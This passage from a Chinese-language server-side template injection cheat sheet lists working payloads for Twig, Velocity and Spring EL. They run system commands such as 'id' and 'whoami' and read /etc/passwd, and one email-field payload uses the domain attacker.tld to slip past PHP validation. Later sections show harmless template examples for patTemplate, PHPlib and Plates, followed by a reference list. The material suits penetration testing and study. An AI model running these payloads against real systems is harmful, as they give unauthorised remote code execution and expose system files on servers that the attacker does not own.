{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}
{{['id']|map('system')|join}}
{{['id',1]|sort('system')|join}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id']|filter('passthru')}}
{{['id']|map('passthru')}}
```

示例：注入值以避免使用引号指定文件名（通过 OFFSET 和 LENGTH 指定有效负载 FILENAME）

```python
FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}
```

带有电子邮件的示例，传递 PHP 的 FILTER_VALIDATE_EMAIL。

```powershell
POST /subscribe?0=cat+/etc/passwd HTTP/1.1
email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
```

---

## Java - Velocity

[官方网站](https://velocity.apache.org/engine/1.7/user-guide.html)

> Velocity 是一个基于Java的模板引擎。它允许网页设计师引用Java代码中定义的方法。

```python
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

---

## Java - Spring

```python
*{7*7}
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

---

## patTemplate

> [patTemplate](https://github.com/wernerwa/pat-template) 是一个不使用编译的PHP模板引擎，它使用XML标签将文档分割成不同的部分

```xml
<patTemplate:tmpl name="page">
  这是主页面。
  <patTemplate:tmpl name="foo">
    它包含另一个模板。
  </patTemplate:tmpl>
  <patTemplate:tmpl name="hello">
    你好 {NAME}。<br/>
  </patTemplate:tmpl>
</patTemplate:tmpl>
```

---

## PHPlib 和 HTML_Template_PHPLIB

[HTML_Template_PHPLIB](https://github.com/pear/HTML_Template_PHPLIB) 与 PHPlib 相同，但移植到了Pear。

`authors.tpl`

```html
<html>
 <head><title>{PAGE_TITLE}</title></head>
 <body>
  <table>
   <caption>作者</caption>
   <thead>
    <tr><th>姓名</th><th>邮箱</th></tr>
   </thead>
   <tfoot>
    <tr><td colspan="2">{NUM_AUTHORS}</td></tr>
   </tfoot>
   <tbody>
<!-- BEGIN authorline -->
    <tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
   </tbody>
  </table>
 </body>
</html>
```

`authors.php`

```php
<?php
//我们想要显示这个作者列表
$authors = array(
    'Christian Weiske'  => 'cweiske@php.net',
    'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//创建模板对象
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//加载文件
$t->setFile('authors', 'authors.tpl');
//设置块
$t->setBlock('authors', 'authorline', 'authorline_ref');

//设置一些变量
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', '截至 ' . date('Y-m-d') . ' 的代码作者');

//显示作者
foreach ($authors as $name => $email) {
    $t->setVar('AUTHOR_NAME', $name);
    $t->setVar('AUTHOR_EMAIL', $email);
    $t->parse('authorline_ref', 'authorline', true);
}

//完成并输出
echo $t->finish($t->parse('OUT', 'authors'));
?>
```

---

## Plates

Plates 受到Twig的启发，但是一个原生PHP模板引擎，而不是编译模板引擎。

控制器：

```php
// 创建新的Plates实例
$templates = new League\Plates\Engine('/path/to/templates');

// 渲染模板
echo $templates->render('profile', ['name' => 'Jonathan']);
```

页面模板：

```php
<?php $this->layout('template', ['title' => '用户资料']) ?>

<h1>用户资料</h1>
<p>你好, <?=$this->e($name)?></p>
```

布局模板：

```php
<html>
  <head>
    <title><?=$this->e($title)?></title>
  </head>
  <body>
    <?=$this->section('content')?>
  </body>
</html>
```



---

## 参考

- [探索Flask Jinja2中的SSTI（第二部分）](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
- [Ruby ERB模板注入 - TrustedSec](https://www.trustedsec.com/2017/09/rubyerb-template-injection/)
- [服务器端模板注入 - RCE用于现代Web应用程序（James Kettle，PortSwigger）](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
- [服务器端模板注入：现代Web应用程序的RCE（@albinowax）](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
- [VelocityServlet表达式语言注入](https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
- [Flask & Jinja2 SSTI备忘单 - Sep 3, 2018 • 由phosphore编写](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
- [在HubL中使用EL注入在Hubspot中获得RCE - @fyoorer](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html?spref=tw)
- [Jinja2模板注入过滤器绕过 - @gehaxelt, @0daywork](https://0day.work/jinja2-template-injection-filter-bypasses/)
- [使用服务器端模板注入（SSTI）获得Shell - David Valles - 2018年8月22日](https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9)
- [利用TPLMAP进行服务器端模板注入 - DIVINE SELORM TSA - 2018年8月18日](https://www.owasp.org/images/7/7e/Owasp_SSTI_final.pdf)
- [以Pebble为例的服务器端模板注入 - Michał Bentkowski | 2019年9月17日](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
- [ASP.NET Razor中的服务器端模板注入（SSTI） - Clément Notin - 2020年4月15日](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/)
- [表达式语言注入 - PortSwigger](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
- [Java bean生长成RCE的Bean Stalking - 2020年7月7日 - Github安全实验室](https://securitylab.github.com/research/bean-validation-RCE)
- [通过EL注入漏洞实现远程代码执行 - Asif Durani - 2019年1月29日](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
- [Shopify应用程序中的Handlebars模板注入和RCE](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
- [实验室：使用记录在案的漏洞对未知语言进行服务器端模板注入](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
- [利用Less.js实现RCE](https://www.softwaresecured.com/exploiting-less-js/)
- [服务器端模板注入（SSTI）的渗透测试指南](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)
- [Django模板服务器端模板注入](https://lifars.com/wp-content/uploads/2021/06/Django-Templates-Server-Side-Template-Injection-v1.0.pdf)
- [#HITB2022SIN #LAB 在加固目标上的模板注入 - Lucas 'BitK' Philippe](https://youtu.be/M0b_KA0OMFw)
- [通过SSTI在Spring Boot错误页面上实现RCE并绕过Akamai WAF - 2022年12月4日](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
- [利用Spring表达式语言（SpEL）注入漏洞（又名魔法SpEL）获取RCE - Xenofon Vassilakopoulos - 2021年11月18日](https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
- [表达式语言注入 - OWASP](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
